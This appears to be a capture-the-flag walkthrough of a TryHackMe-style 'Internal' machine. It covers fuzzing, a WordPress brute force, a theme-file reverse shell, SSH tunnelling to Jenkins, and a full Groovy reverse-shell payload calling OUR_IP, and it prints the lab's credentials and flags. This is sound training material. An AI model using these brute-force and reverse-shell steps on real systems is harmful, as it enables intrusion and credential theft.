We got a simple apache2 ubuntu page, source code is normal too, let's fuzz then:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://internal.thm/FUZZ" -ic -c -t 200

        /'___\  /'___\           /'___\

```

Well we got some stuff, let's check it out:


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529135321.png)

We can see that on `/wordpress`, interesting part is the search bar, as we can see, there is something written that says:

```
It looks like nothing was found at this location. Maybe try a search?
```

I tried `XSS` and `LFI` on here but none worked, so I tried searching for `wordpress` and this happened:


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529135808.png)

If we go to `your dashboard`, we get this url:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529135828.png)

Seems like an internal resource, if we got `SSRF` we can maybe get access to that panel, but there's no need, since we know we are dealing with a `wordpress` site, best approach would be using `wpscan` to enumerate all possible attack vectors:

```
wpscan --url http://internal.thm/blog -e vp,u
```

Nothing too important can be found rather than there's an user on here:

```
admin
```

We find this also inside of the `hello world!` post inside of `/blog`:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529140149.png)


Knowing this info, we can try brute forcing using `wpscan` too, there's a `wp-login.php` page we can find:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529140506.png)

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529140518.png)

Let's proceed with exploitation.


# EXPLOITATION
---

We need to brute force, let's use this command:

```
wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

It will take some time, after it finishes we get:


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529141114.png)


We got credentials: 

```
admin:my2boys
```


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529141427.png)

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529141513.png)

As seen, we got access to the admin panel, on here, we can check this on the posts:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529141550.png)

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529141610.png)

We got a reminder to reset `will's` credentials, we got:

```
william:arnold147
```

I tried these at ssh but no luck, seems like we need to get a reverse shell through the themes as usual, let's do it:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529141847.png)

On here, add a reverse shell:


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529141925.png)

Update the file and go to, we need to have our listener ready:

```
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529142034.png)

We got our reverse shell, let's begin privilege escalation.

# PRIVILEGE ESCALATION
---


First step is to stabilize our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529142155.png)

There we go, now we can look around, let's use `linpeas`:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529142819.png)

Let's read it:

```
www-data@internal:/tmp$ cat /opt/wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

We got credentials for ssh:


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529142909.png)

We can now read `user.txt`:

```
aubreanna@internal:~$ cat user.txt
THM{int3rna1_fl4g_1}
```

On our home directory, we can find this:

```
aubreanna@internal:~$ ls -la
total 56
drwx------ 7 aubreanna aubreanna 4096 Aug  3  2020 .

aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```

We can verify this using:

```
aubreanna@internal:~$ netstat -tulnp

```

Knowing this, we can use ssh tunnels to get the contents of the jenkins website on our machine, let's do:

```
ssh -L 8888:172.17.0.2:8080 aubreanna@internal.thm
```

We can now access it at:

```
http://localhost:8888
```

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529143436.png)

I tried same credentials as ssh but they didn't work, we need to bruteforce using either burp or caido, I will use caido because it's faster, capture the request and do:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529143832.png)

We can see our request, let's send it to automate:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529144006.png)

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529144538.png)

Run it and check:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529144940.png)

Length on that one is different, credentials are:

```
admin:spongebob
```

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529145030.png)

Inside of `jenkins`, we can use `Script Console` to get ourselves a reverse shell as `jenkins`, let's do it:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529145112.png)

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529145118.png)

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529145132.png)

As seen, this is being managed by groovy, we can guide ourselves on this medium post:

```
https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6
```

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529145235.png)

```java
String host="OUR_IP";
int port=8044;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```


Once we run this on the console, we get a reverse shell:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529145512.png)

Let's stabilize our shell once again:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

We can use `linpeas` again:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529145945.png)

Once again, in `/opt` we got a note:

```
jenkins@jenkins:/tmp$ cat /opt/note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you
need access to the root user account.

root:tr0ub13guM!@#123
```

We got credentials for root, let's go into ssh session then:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529150034.png)

We can now read root flag and finish the room:

```
root@internal:~# cat /root/root.txt
THM{d0ck3r_d3str0y3r}
```
